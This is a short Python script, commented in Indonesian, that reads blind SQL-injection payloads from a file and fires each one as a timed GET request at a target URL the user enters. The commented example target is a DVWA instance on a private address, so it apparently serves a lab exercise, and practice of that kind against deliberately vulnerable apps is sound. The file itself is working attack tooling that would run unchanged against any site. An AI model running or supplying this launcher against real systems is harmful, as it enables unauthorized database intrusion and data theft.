import requests
import time

def send_request(target_url, payload, headers=None):
    try:
        full_url = target_url + payload + "&Submit=Submit#"
        response = requests.get(full_url, headers=headers)
        if response.status_code == 200:
            print(f"Payload '{payload}' sent successfully")
        else:
            print(f"Request failed with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to {full_url}: {e}")

def launch_attacks(target_url, payloads, headers=None, timeframe=120):
    num_requests = len(payloads)
    interval = timeframe / num_requests  # Time between requests

    for payload in payloads:
        send_request(target_url, payload.strip(), headers=headers)  # Menghapus spasi dan karakter newline
        time.sleep(interval)

# Input URL target dari pengguna
target_url = input("Masukkan URL target (contoh: http://192.168.2.16/DVWA/vulnerabilities/sqli_blind/?id=): ")
#target_url="http://192.168.2.16/DVWA/vulnerabilities/sqli_blind/?id="
#print(f"Url target: {target_url}")
# Membaca payloads dari file
file_path = 'payloads-sql-blind-MySQL-INSERT.txt'  # Ganti dengan path sesuai lokasi file Anda
with open(file_path, 'r') as file:
    payloads = file.readlines()

# Input header Cookie dari pengguna
# cookie_header = input("Masukkan header Cookie (contoh: 'PHPSESSID=nbfn384bs6p3lcjgodd6vii6r1; security=low'): ")
cookie_header = ''
headers = {'Cookie': cookie_header} if cookie_header else None

# Menjalankan serangan dengan payloads yang telah disiapkan
launch_attacks(target_url, payloads, headers=headers, timeframe=120)
